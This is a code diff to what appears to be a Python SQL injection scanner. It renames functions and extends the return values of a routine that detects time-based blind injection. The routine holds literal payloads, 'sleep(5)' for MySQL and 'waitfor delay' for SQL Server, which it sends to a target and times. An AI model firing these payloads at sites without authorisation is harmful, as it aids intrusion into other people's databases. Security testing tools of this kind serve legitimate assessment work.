@@ -1,10 +1,10 @@
-from sqlinjection import check_waf
+from sqlinjection import CheckWaf
 import time
 import requests
 import core
 import urllib.parse as urlparse
 
-def time_in(domain,queries,old_html):
+def TimeIn(domain,queries,old_html):
     sql_times = {
         "MySQL": (r" and sleep(5)", r"' and sleep(5) and '8590'='8590", r'''" and sleep(5) and "8590"="8590'''),
         "Microsoft SQL Server": (r" waitfor delay '0:0:5'--+", r"' waitfor delay '0:0:5'--+", r'''" waitfor delay '0:0:5'--+'''),
@@ -23,10 +23,10 @@ def time_in(domain,queries,old_html):
                 delta1 = end_time_1 - start_time
                 delta2 = end_time_2 - end_time_1
                 if (delta2 - delta1) > 4:
-                    return True,db
-                elif check_waf.check_have_waf(old_html, rep1.text):
-                    return False, "waf"
+                    return True,db,website
+                elif CheckWaf.CheckHaveWaf(old_html, rep1.text):
+                    return False, "waf",website
             except:
                 pass
-    return False,None
+    return False,None,None
 
